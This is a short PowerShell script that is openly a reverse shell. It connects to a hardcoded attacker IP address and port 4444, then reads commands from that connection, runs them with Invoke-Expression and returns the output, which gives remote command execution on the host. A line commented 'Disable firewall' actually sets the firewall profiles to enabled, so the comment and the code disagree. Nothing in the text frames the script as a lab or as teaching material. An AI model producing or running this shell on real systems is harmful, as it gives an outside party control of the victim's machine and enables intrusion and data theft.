$attacker_ip = '10.22.22.138'
$attacker_port = 4444

# Disable firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Establish the reverse shell connection
$client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $attacker_port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while ($true) {
    try {
        $i = $stream.Read($bytes, 0, $bytes.Length)
        if ($i -le 0) { break }
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    } catch {
        break
    }
}
$client.Close()